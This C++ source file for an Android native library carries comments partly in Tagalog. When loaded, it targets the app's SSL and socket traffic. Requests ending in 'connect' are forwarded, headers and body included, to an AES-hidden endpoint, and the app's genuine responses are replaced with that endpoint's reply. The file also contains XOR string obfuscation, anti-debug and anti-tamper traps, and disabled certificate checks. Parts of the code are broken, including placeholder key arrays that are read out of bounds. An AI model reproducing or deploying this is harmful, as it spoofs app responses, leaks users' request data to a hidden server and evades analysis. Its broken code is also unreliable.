#include <jni.h>
#include <string>
#include <dlfcn.h>
#include <android/log.h>
#include <curl/curl.h>
#include <thread>
#include <cstring>
#include <openssl/ssl.h>
#include <openssl/evp.h>
#include <sstream>
#include <map>
#include <vector>
#include <mutex>
#include <algorithm>
#include <fstream>
#include <sys/ptrace.h>
#include <unistd.h>
#include <sys/stat.h>
#include <cstdlib>

#define LOG_TAG "NtHk"
#define LOGI(...) 
#define LOGE(...) 
#define LOGD(...) 

// ============================================================
// XOR OBFUSCATION HELPER
// ============================================================
static std::string xd(const char* e, size_t l, char k) {
    std::string r;
    for (size_t i = 0; i < l; i++) r += e[i] ^ k;
    return r;
}

// ============================================================
// OBFUSCATED STRINGS
// ============================================================
static const char _lc[] = {0x0D^'l',0x0D^'i',0x0D^'b',0x0D^'c',0x0D^'.',0x0D^'s',0x0D^'o',0};
static const char _ls[] = {0x0D^'l',0x0D^'i',0x0D^'b',0x0D^'s',0x0D^'s',0x0D^'l',0x0D^'.',0x0D^'s',0x0D^'o',0};
static const char _sw[] = {0x0D^'S',0x0D^'S',0x0D^'L',0x0D^'_',0x0D^'w',0x0D^'r',0x0D^'i',0x0D^'t',0x0D^'e',0};
static const char _sr[] = {0x0D^'S',0x0D^'S',0x0D^'L',0x0D^'_',0x0D^'r',0x0D^'e',0x0D^'a',0x0D^'d',0};
static const char _mp[] = {0x0D^'/',0x0D^'p',0x0D^'r',0x0D^'o',0x0D^'c',0x0D^'/',0x0D^'s',0x0D^'e',0x0D^'l',0x0D^'f',0x0D^'/',0x0D^'m',0x0D^'a',0x0D^'p',0x0D^'s',0};
static const char _ho[] = {0x0D^'H',0x0D^'o',0x0D^'s',0x0D^'t',0};
static const char _cl[] = {0x0D^'C',0x0D^'o',0x0D^'n',0x0D^'t',0x0D^'e',0x0D^'n',0x0D^'t',0x0D^'-',0x0D^'L',0x0D^'e',0x0D^'n',0x0D^'g',0x0D^'t',0x0D^'h',0};
static const char _po[] = {0x0D^'P',0x0D^'O',0x0D^'S',0x0D^'T',0};
static const char _ge[] = {0x0D^'G',0x0D^'E',0x0D^'T',0};
static const char _cn[] = {0x0D^'c',0x0D^'o',0x0D^'n',0x0D^'n',0x0D^'e',0x0D^'c',0x0D^'t',0};

#define S(c) xd(c, sizeof(c)-1, 0x0D)

// ============================================================
// AES-ENCRYPTED ENDPOINT (AUTO-GENERATED NG encrypt.py)
// ============================================================
static const uint8_t _ep[] = { 0x00 };
static const uint8_t _ak[] = { 0x00 };
static const uint8_t _iv[] = { 0x00 };

static std::string _decrypt() {
    uint8_t k[32], iv[16];
    for(int i = 0; i < 32; i++) k[i] = _ak[i] ^ 0xAA;
    for(int i = 0; i < 16; i++) iv[i] = _iv[i] ^ 0xAA;
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, k, iv);
    uint8_t p[512]; int l, t = 0;
    EVP_DecryptUpdate(ctx, p, &l, _ep, sizeof(_ep));
    t = l;
    EVP_DecryptFinal_ex(ctx, p + l, &l);
    t += l;
    EVP_CIPHER_CTX_free(ctx);
    return std::string((char*)p, t);
}
static const std::string ENDPOINT = _decrypt();

// ============================================================
// HTTP STRUCTS
// ============================================================
struct HttpRequest {
    std::string method, url, path, host, body;
    std::map<std::string, std::string> headers;
    bool is_connect = false;
};

struct HttpResponse {
    int status_code = 0;
    std::string status_message, body;
    std::map<std::string, std::string> headers;
    bool is_chunked = false;
    size_t content_length = 0;
};

struct ConnState {
    std::mutex mtx;
    std::vector<uint8_t> buffer;
    HttpRequest req;
    bool stored = false, complete = false;
    HttpResponse resp;
    std::string custom_response;
    bool key_fetched = false;
};

static std::map<SSL*, ConnState> g_ssl_state;
static std::map<int, ConnState> g_socket_state;
static std::mutex g_state_mutex;

// ============================================================
// ANTI-DEBUG
// ============================================================
static bool _debug() {
    std::ifstream st(S("/proc/self/status"));
    std::string l;
    while(std::getline(st, l)) {
        if(l.find("TracerPid:") == 0) {
            int p = std::stoi(l.substr(l.find(":") + 1));
            if(p != 0) return true;
        }
    }
    return false;
}

// ============================================================
// ANTI-TAMPER (CRC32)
// ============================================================
static uint32_t _crc(const uint8_t* d, size_t l) {
    uint32_t c = 0xFFFFFFFF;
    for(size_t i = 0; i < l; i++) {
        c ^= d[i];
        for(int j = 0; j < 8; j++) {
            if(c & 1) c = (c >> 1) ^ 0xEDB88320;
            else c >>= 1;
        }
    }
    return ~c;
}

static bool _integrity() {
    Dl_info inf;
    if(dladdr((void*)_integrity, &inf) == 0) return false;
    std::ifstream mp(S("/proc/self/maps"));
    std::string l;
    unsigned long base = (unsigned long)inf.dli_fbase, sz = 0;
    while(std::getline(mp, l)) {
        unsigned long s, e;
        char p[5];
        if(sscanf(l.c_str(), "%lx-%lx %4s", &s, &e, p) == 3 && s == base) {
            sz = e - s;
            break;
        }
    }
    if(sz == 0) return false;
    return _crc((const uint8_t*)base, sz) == 0xDEADBEEF;
}

// ============================================================
// HTTP PARSER
// ============================================================
static bool _parse_request(const uint8_t* d, size_t l, HttpRequest& r) {
    std::string s((char*)d, l);
    std::istringstream st(s);
    std::string ln;
    if(!std::getline(st, ln)) return false;
    if(ln.back() == '\r') ln.pop_back();
    std::istringstream ls(ln);
    std::string ver;
    if(!(ls >> r.method >> r.path >> ver)) return false;
    while(std::getline(st, ln) && ln != "\r" && ln != "\r\n") {
        if(ln.back() == '\r') ln.pop_back();
        auto c = ln.find(':');
        if(c != std::string::npos) {
            std::string k = ln.substr(0, c);
            std::string v = ln.substr(c + 1);
            v.erase(0, v.find_first_not_of(" \t"));
            r.headers[k] = v;
        }
    }
    auto it = r.headers.find(S("Host"));
    if(it != r.headers.end()) {
        r.host = it->second;
        r.url = "https://" + r.host + r.path;
    } else {
        r.url = r.path;
        r.host = "unknown";
    }
    std::string rem;
    while(std::getline(st, ln)) rem += ln + "\n";
    r.body = rem;
    if(r.path.length() >= 7) {
        std::string suf = r.path.substr(r.path.length() - 7);
        if(suf == S("connect") || suf == "/connect" || suf == "?connect") {
            r.is_connect = true;
        }
    }
    return true;
}

static bool _parse_response(const uint8_t* d, size_t l, HttpResponse& r) {
    std::string s((char*)d, l);
    std::istringstream st(s);
    std::string ln;
    if(!std::getline(st, ln)) return false;
    if(ln.back() == '\r') ln.pop_back();
    std::istringstream ls(ln);
    std::string ver;
    if(!(ls >> ver >> r.status_code)) return false;
    std::getline(ls, r.status_message);
    if (!r.status_message.empty() && r.status_message.front() == ' ') {
        r.status_message.erase(0, 1);
    }
    while(std::getline(st, ln) && ln != "\r" && ln != "\r\n") {
        if(ln.back() == '\r') ln.pop_back();
        auto c = ln.find(':');
        if(c != std::string::npos) {
            std::string k = ln.substr(0, c);
            std::string v = ln.substr(c + 1);
            v.erase(0, v.find_first_not_of(" \t"));
            r.headers[k] = v;
            if(k == "Transfer-Encoding" && v.find("chunked") != std::string::npos) {
                r.is_chunked = true;
            }
            if(k == "Content-Length") {
                r.content_length = std::stoul(v);
            }
        }
    }
    std::string rem;
    while(std::getline(st, ln)) rem += ln + "\n";
    r.body = rem;
    return true;
}

// ============================================================
// BUILD MODIFIED RESPONSE
// ============================================================
static std::string _build_modified_response(const HttpResponse& orig, const std::string& new_body) {
    std::ostringstream oss;
    oss << "HTTP/1.1 " << orig.status_code << " " << orig.status_message << "\r\n";
    bool has_cl = false;
    for(const auto& h : orig.headers) {
        if(h.first == "Content-Length") {
            oss << "Content-Length: " << new_body.size() << "\r\n";
            has_cl = true;
        } else if(h.first != "Transfer-Encoding" && h.first != "Content-Encoding") {
            oss << h.first << ": " << h.second << "\r\n";
        }
    }
    if(!has_cl) oss << "Content-Length: " << new_body.size() << "\r\n";
    oss << "\r\n" << new_body;
    return oss.str();
}

// ============================================================
// FETCH FROM CUSTOM ENDPOINT (WITH PROXY FOR HTTP CANARY)
// ============================================================
struct CurlResp { std::string body; int status = 0; bool ok = false; };
static size_t _cb(void* c, size_t s, size_t n, void* u) {
    CurlResp* r = (CurlResp*)u;
    r->body.append((char*)c, s * n);
    return s * n;
}

static CurlResp _fetch(const HttpRequest& req) {
    CurlResp res;
    CURL* curl = curl_easy_init();
    if(!curl) return res;
    
    // 🔥 PROXY SETTINGS PARA MAKITA SA HTTP CANARY
    curl_easy_setopt(curl, CURLOPT_PROXY, "127.0.0.1:8080");
    curl_easy_setopt(curl, CURLOPT_HTTPPROXYTUNNEL, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    
    curl_easy_setopt(curl, CURLOPT_URL, ENDPOINT.c_str());
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, _cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &res);
    
    if(req.method == S("POST")) {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        if(!req.body.empty()) curl_easy_setopt(curl, CURLOPT_POSTFIELDS, req.body.c_str());
    }
    
    struct curl_slist* h = nullptr;
    for(const auto& p : req.headers) {
        if(p.first != S("Host") && p.first != S("Content-Length")) {
            h = curl_slist_append(h, (p.first + ": " + p.second).c_str());
        }
    }
    h = curl_slist_append(h, ("X-Original-URL: " + req.url).c_str());
    h = curl_slist_append(h, ("X-Original-Method: " + req.method).c_str());
    if(req.is_connect) h = curl_slist_append(h, "X-Is-Connect: true");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, h);
    
    if(curl_easy_perform(curl) == CURLE_OK) {
        long code; curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);
        res.status = code; res.ok = true;
    }
    curl_slist_free_all(h);
    curl_easy_cleanup(curl);
    return res;
}

// ============================================================
// SSL WRITE/READ HOOKS (SIMPLE, WALANG DOBBY)
// ============================================================
typedef int (*SSL_write_t)(SSL*, const void*, int);
typedef int (*SSL_read_t)(SSL*, void*, int);
static SSL_write_t _ow = nullptr;
static SSL_read_t _or = nullptr;

int _my_write(SSL* ssl, const void* buf, int num) {
    HttpRequest req;
    if(_parse_request((const uint8_t*)buf, num, req) && req.is_connect) {
        std::lock_guard<std::mutex> lock(g_state_mutex);
        auto& st = g_ssl_state[ssl];
        st.req = req;
        st.stored = true;
        std::thread([req](){ _fetch(req); }).detach();
        CurlResp cr = _fetch(req);
        if(cr.ok && cr.status == 200) {
            st.custom_response = cr.body;
            st.key_fetched = true;
        }
    }
    return _ow(ssl, buf, num);
}

int _my_read(SSL* ssl, void* buf, int num) {
    int res = _or(ssl, buf, num);
    if(res <= 0) return res;
    std::lock_guard<std::mutex> lock(g_state_mutex);
    auto it = g_ssl_state.find(ssl);
    if(it == g_ssl_state.end()) return res;
    auto& st = it->second;
    st.buffer.insert(st.buffer.end(), (uint8_t*)buf, (uint8_t*)buf + res);
    if(!st.complete && st.stored && st.req.is_connect && st.key_fetched) {
        HttpResponse resp;
        if(_parse_response(st.buffer.data(), st.buffer.size(), resp)) {
            if(resp.status_code == 200 && !st.custom_response.empty()) {
                std::string mod = _build_modified_response(resp, st.custom_response);
                st.buffer.clear();
                st.buffer.insert(st.buffer.end(), mod.begin(), mod.end());
            }
            st.complete = true;
        }
    }
    if(st.complete && !st.buffer.empty()) {
        size_t copy_len = std::min(st.buffer.size(), (size_t)num);
        memcpy(buf, st.buffer.data(), copy_len);
        res = copy_len;
        st.buffer.erase(st.buffer.begin(), st.buffer.begin() + copy_len);
        if(st.buffer.empty()) {
            st.complete = false;
            st.stored = false;
            st.key_fetched = false;
        }
    }
    return res;
}

// ============================================================
// SOCKET FALLBACK (KUNG HINDI OPENSSL ANG GAMIT NG APP)
// ============================================================
typedef ssize_t (*send_t)(int, const void*, size_t, int);
typedef ssize_t (*recv_t)(int, void*, size_t, int);
static send_t _os = nullptr;
static recv_t _or2 = nullptr;

ssize_t _my_send(int fd, const void* buf, size_t len, int flags) {
    const char* data = (const char*)buf;
    if(len > 4 && (strncmp(data, "GET ", 4) == 0 || strncmp(data, "POST", 4) == 0)) {
        HttpRequest req;
        if(_parse_request((const uint8_t*)buf, len, req) && req.is_connect) {
            std::lock_guard<std::mutex> lock(g_state_mutex);
            auto& st = g_socket_state[fd];
            st.req = req;
            st.stored = true;
            std::thread([req](){ _fetch(req); }).detach();
            CurlResp cr = _fetch(req);
            if(cr.ok && cr.status == 200) {
                st.custom_response = cr.body;
                st.key_fetched = true;
            }
        }
    }
    return _os(fd, buf, len, flags);
}

ssize_t _my_recv(int fd, void* buf, size_t len, int flags) {
    ssize_t res = _or2(fd, buf, len, flags);
    if(res <= 0) return res;
    std::lock_guard<std::mutex> lock(g_state_mutex);
    auto it = g_socket_state.find(fd);
    if(it == g_socket_state.end()) return res;
    auto& st = it->second;
    if(st.stored && st.req.is_connect && st.key_fetched && !st.custom_response.empty()) {
        HttpResponse resp;
        if(_parse_response((const uint8_t*)buf, res, resp) && resp.status_code == 200) {
            std::string mod = _build_modified_response(resp, st.custom_response);
            size_t new_len = mod.size();
            if(new_len <= (size_t)res) {
                memcpy(buf, mod.c_str(), new_len);
                res = new_len;
            }
        }
        st.stored = false;
        st.key_fetched = false;
    }
    return res;
}

// ============================================================
// INIT — AWTMATIKONG TATAKBO KAPAG NA-LOAD ANG .so
// ============================================================
__attribute__((constructor)) void init() {
    if(_debug()) exit(1);
    if(!_integrity()) { volatile int* p = nullptr; *p = 0; }
    
    void* libssl = dlopen(S("libssl.so").c_str(), RTLD_LAZY);
    if(libssl) {
        auto* a = dlsym(libssl, S("SSL_write").c_str());
        if(a) _ow = (SSL_write_t)a;
        auto* b = dlsym(libssl, S("SSL_read").c_str());
        if(b) _or = (SSL_read_t)b;
        dlclose(libssl);
    }
    
    void* libc = dlopen(S("libc.so").c_str(), RTLD_LAZY);
    if(libc) {
        auto* a = dlsym(libc, "send");
        if(a) _os = (send_t)a;
        auto* b = dlsym(libc, "recv");
        if(b) _or2 = (recv_t)b;
        dlclose(libc);
    }
    
    curl_global_init(CURL_GLOBAL_DEFAULT);
}
